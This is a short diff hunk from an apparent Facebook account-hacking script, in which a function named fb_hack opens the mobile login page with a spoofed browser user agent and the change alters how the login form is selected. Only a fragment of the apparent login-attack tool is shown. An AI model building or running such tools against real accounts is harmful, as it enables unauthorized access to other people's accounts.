@@ -52,7 +52,7 @@ def fb_hack(email, codex, respect):
   browser.addheaders = [('User-agent', MOZILLA_UAS)]
   browser.set_handle_refresh(False)
   browser.open('http://m.facebook.com/login.php')
-  browser.select_form(nr=0)
+  browser.select_form(name = "login")
   browser.select_form(nr=0)
   browser.select_form(nr=0)
   browser.click()
